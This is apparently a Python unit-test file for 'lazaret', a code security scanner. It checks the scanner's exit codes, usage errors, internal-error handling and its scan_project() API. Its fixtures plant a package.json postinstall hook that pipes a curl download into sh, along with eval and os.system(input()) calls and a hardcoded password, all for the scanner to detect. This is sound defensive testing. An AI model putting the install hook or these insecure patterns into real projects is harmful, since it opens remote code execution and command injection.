"""Review items 4, 6 (exit code) and 12 (FIX-SPEC 10), and scan_project().

4. Uncaught exceptions escaped as a raw traceback with exit 1 — the same
   code as "quality gate failed". Now any internal error prints
   `error: internal: …` and exits 5 (traceback only with LAZARET_DEBUG=1).
   One file's scan exception becomes an INFO Q-SCAN-ERROR finding instead
   of killing the run.
6. main() exited 1 WITHOUT --ci for any CRITICAL SC-* finding (documented:
   0 without --ci). Only SC-MANIFEST-DEPTH forces exit 1 without --ci now.
12. Usage errors exit 2 with a clear message: a missing target, a file
   instead of a directory, an empty directory, an unreadable directory.

scan_project() is the one project-scan pipeline (collect -> scan -> manifests
-> collection findings -> flow -> skipped trees -> gate -> redaction) shared
by the CLI and, later, the MCP server; it must be reusable in one process.
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from tests import _support
from lazaret.scanner import core

PY = sys.executable


def make_tree(files):
    root = tempfile.mkdtemp(prefix="lz-review-cli-")
    for rel, data in files.items():
        path = os.path.join(root, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(data)
    return root


def run(args, env=None):
    return subprocess.run([PY, _support.CLI, *args], capture_output=True, encoding="utf-8",
                          errors="replace", timeout=40, env=env)


# Runs the real CLI with scan_project() replaced by one that raises.
BOOM = ("import sys\n"
        "from lazaret.scanner import core\n"
        "def boom(*a, **k):\n"
        "    raise KeyError('\\x1b[31mcrafted')\n"
        "core.scan_project = boom\n"
        "sys.exit(core.main(sys.argv[1:]))\n")


def run_report(root, *extra):
    out = tempfile.mkdtemp(prefix="lz-review-out-")
    try:
        p = run([root, "--out-dir", out, "--no-html", *extra])
        report = None
        path = os.path.join(out, "lazaret-report.json")
        if os.path.exists(path):
            with open(path, encoding="utf-8") as fh:
                report = json.load(fh)
    finally:
        shutil.rmtree(out, ignore_errors=True)
    return p, report


class ExitCodes(unittest.TestCase):
    def test_critical_supply_chain_finding_exits_0_without_ci(self):
        root = make_tree({"a.py": "x = 1\n", "big.py": "x = 1\n" * 400_000,
                          "package.json": json.dumps(
                              {"scripts": {"postinstall": "curl -s http://192.0.2.1/x | sh"}})})
        self.addCleanup(shutil.rmtree, root, True)
        p, report = run_report(root)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertFalse(report["pass"])
        self.assertTrue({"SC-TRUNCATED", "SC-INSTALL-HOOK"} <= {i["rule"] for i in report["issues"]})
        p, _ = run_report(root, "--ci")
        self.assertEqual(p.returncode, 1, p.stderr)

    def test_manifest_depth_still_forces_exit_1(self):
        root = make_tree({"a.py": "x = 1\n", "package.json": "[" * 120000})
        self.addCleanup(shutil.rmtree, root, True)
        p, report = run_report(root)
        self.assertEqual(p.returncode, 1, p.stderr)
        self.assertIn("SC-MANIFEST-DEPTH", {i["rule"] for i in report["issues"]})


class UsageErrors(unittest.TestCase):
    def test_missing_target(self):
        p = run([os.path.join(tempfile.gettempdir(), "lz-no-such-dir-4711")])
        self.assertEqual(p.returncode, 2)
        self.assertIn("does not exist", p.stderr)
        self.assertNotIn("Traceback", p.stderr)

    def test_file_target(self):
        root = make_tree({"a.py": "x = 1\n"})
        self.addCleanup(shutil.rmtree, root, True)
        p = run([os.path.join(root, "a.py")])
        self.assertEqual(p.returncode, 2)
        self.assertIn("is not a directory", p.stderr)

    def test_empty_directory(self):
        for files in ({}, {"README.md": "# docs\n"}, {"node_modules/x/i.js": "x\n"},
                      {".git/config": "[core]\n"}):
            with self.subTest(files=sorted(files)):
                root = make_tree(files)
                self.addCleanup(shutil.rmtree, root, True)
                p = run([root, "--no-html", "--no-json"])
                self.assertEqual(p.returncode, 2, p.stdout)
                self.assertIn("nothing to scan", p.stderr)

    def test_unreadable_root_is_a_usage_error(self):
        root = make_tree({"a.py": "x = 1\n"})
        self.addCleanup(shutil.rmtree, root, True)
        with mock.patch.object(core.os, "scandir", side_effect=PermissionError(13, "Permission denied")):
            with self.assertRaises(core.ScanTargetError) as cm:
                core.scan_project(root)
        self.assertIn("cannot read directory", str(cm.exception))

    def test_unknown_option(self):
        root = make_tree({"a.py": "x = 1\n"})
        self.addCleanup(shutil.rmtree, root, True)
        self.assertEqual(run([root, "--no-such-option"]).returncode, 2)


class InternalErrors(unittest.TestCase):
    def setUp(self):
        self.root = make_tree({"a.py": "x = 1\n"})
        self.addCleanup(shutil.rmtree, self.root, True)
        fd, self.script = tempfile.mkstemp(suffix=".py")
        with os.fdopen(fd, "w") as fh:
            fh.write(BOOM)
        self.addCleanup(os.unlink, self.script)

    def launch(self, debug):
        env = dict(os.environ)
        env.pop("LAZARET_DEBUG", None)
        if debug:
            env["LAZARET_DEBUG"] = "1"
        env["PYTHONPATH"] = _support.SRC + os.pathsep + env.get("PYTHONPATH", "")
        return subprocess.run([PY, self.script, self.root, "--no-html", "--no-json"],
                              capture_output=True, encoding="utf-8", errors="replace",
                              timeout=40, env=env)

    def test_exit_5_without_traceback(self):
        p = self.launch(debug=False)
        self.assertEqual(p.returncode, 5, p.stderr)
        self.assertIn("error: internal: KeyError", p.stderr)
        self.assertNotIn("Traceback", p.stderr)
        self.assertNotIn("\x1b", p.stderr)          # message is terminal-sanitized
        self.assertIn("LAZARET_DEBUG=1", p.stderr)

    def test_debug_shows_traceback(self):
        p = self.launch(debug=True)
        self.assertEqual(p.returncode, 5)
        self.assertIn("Traceback (most recent call last)", p.stderr)
        self.assertIn("error: internal: KeyError", p.stderr)

    def test_main_passes_system_exit_through(self):
        import contextlib
        import io
        with self.assertRaises(SystemExit) as cm, contextlib.redirect_stderr(io.StringIO()):
            core.main([os.path.join(self.root, "missing")])
        self.assertEqual(cm.exception.code, 2)


class PerFileErrors(unittest.TestCase):
    def test_one_file_exception_becomes_a_finding(self):
        root = make_tree({"a.py": "eval(x)\n", "boom.py": "x = 1\n", "package.json": "{}"})
        self.addCleanup(shutil.rmtree, root, True)
        real = core.scan_file

        def scan_file(path, content, lang, dep=False):
            if path == "boom.py":
                raise RecursionError("maximum recursion depth exceeded")
            return real(path, content, lang, dep=dep)
        with mock.patch.object(core, "scan_file", scan_file), \
                mock.patch.object(core, "scan_manifest", side_effect=ValueError("bad")):
            res = core.scan_project(root)
        errs = {i["file"]: i for i in res["issues"] if i["rule"] == "Q-SCAN-ERROR"}
        self.assertEqual(set(errs), {"boom.py", "package.json"})
        self.assertIn("RecursionError", errs["boom.py"]["msg"])
        self.assertEqual(errs["boom.py"]["sev"], "INFO")
        self.assertIn("S-EVAL-PY", {i["rule"] for i in res["issues"] if i["file"] == "a.py"})


class ScanProjectApi(unittest.TestCase):
    FILES = {"app.py": 'import os\npassword = "hunter2hunter2"\nos.system(input())\n',
             "node_modules/p/index.js": 'var api_key = "k3y-value-inert";\n',
             "lib/util.js": "var a = 1;\n"}

    def setUp(self):
        self.root = make_tree(self.FILES)
        self.addCleanup(shutil.rmtree, self.root, True)

    def test_result_shape(self):
        res = core.scan_project(self.root)
        for key in ("project", "scannedAt", "pass", "conditions", "metrics", "counts", "ratings",
                    "supplyChain", "crossFile", "perFile", "issues", "warnings"):
            self.assertIn(key, res)
        self.assertEqual(res["project"], os.path.abspath(self.root))
        self.assertEqual(res["warnings"], [])
        rules = {i["rule"] for i in res["issues"]}
        self.assertTrue({"S-OSCMD-PY", "S-SECRET", "Q-SKIPPED-TREE"} <= rules, rules)
        json.dumps(res)                                 # report-ready

    def test_same_result_as_the_cli(self):
        out = tempfile.mkdtemp(prefix="lz-review-out-")
        self.addCleanup(shutil.rmtree, out, True)
        p = run([self.root, "--out-dir", out, "--no-html"])
        self.assertEqual(p.returncode, 0, p.stderr)
        with open(os.path.join(out, "lazaret-report.json"), encoding="utf-8") as fh:
            cli = json.load(fh)
        api = core.scan_project(self.root)
        key = lambda r: sorted((i["rule"], i["file"], i["line"]) for i in r["issues"])
        self.assertEqual(key(api), key(cli))
        self.assertEqual(api["pass"], cli["pass"])

    def test_repeatable_and_redaction_restored(self):
        before = core.REDACT_SECRETS
        first = core.scan_project(self.root)
        raw = core.scan_project(self.root, redact_secrets=False)
        again = core.scan_project(self.root)
        self.assertEqual(core.REDACT_SECRETS, before)
        snip = lambda r: [i["snippet"] for i in r["issues"] if i["rule"] == "S-SECRET"][0]
        self.assertNotIn("hunter2hunter2", json.dumps(snip(first)))
        self.assertIn("hunter2hunter2", json.dumps(snip(raw)))
        self.assertEqual(json.dumps(first["issues"]), json.dumps(again["issues"]))

    def test_exclude_and_deps(self):
        res = core.scan_project(self.root, exclude=["lib"], include_deps=True)
        files = {i["file"].replace(os.sep, "/") for i in res["issues"]}
        self.assertIn("node_modules/p/index.js", files)
        self.assertIn("lib", files)                     # Q-SKIPPED-TREE for the exclusion

    def test_flow_failure_degrades_with_a_warning(self):
        if core.lazaret_flow is None:
            self.skipTest("flow engine unavailable")
        with mock.patch.object(core.lazaret_flow, "analyze", side_effect=AttributeError("Num")):
            res = core.scan_project(self.root)
        self.assertEqual(len(res["warnings"]), 1)
        self.assertIn("interprocedural taint analysis skipped (AttributeError", res["warnings"][0])
        self.assertIn("S-OSCMD-PY", {i["rule"] for i in res["issues"]})

    def test_cli_prints_flow_warning(self):
        env = dict(os.environ)
        env["PYTHONPATH"] = _support.SRC + os.pathsep + env.get("PYTHONPATH", "")
        code = ("import sys\nfrom lazaret.scanner import core, flow\n"
                "def bad(files):\n    raise AttributeError('Num')\n"
                "flow.analyze = bad\nsys.exit(core.main(sys.argv[1:]))\n")
        p = subprocess.run([PY, "-c", code, self.root, "--no-html", "--no-json"],
                           capture_output=True, encoding="utf-8", errors="replace",
                           timeout=40, env=env)
        self.assertEqual(p.returncode, 0, p.stderr)
        self.assertIn("warning: interprocedural taint analysis skipped", p.stderr)

    def test_missing_root(self):
        with self.assertRaises(core.ScanTargetError):
            core.scan_project(os.path.join(self.root, "nope"))
        with self.assertRaises(core.ScanTargetError):
            core.scan_project(os.path.join(self.root, "app.py"))


if __name__ == "__main__":
    unittest.main()
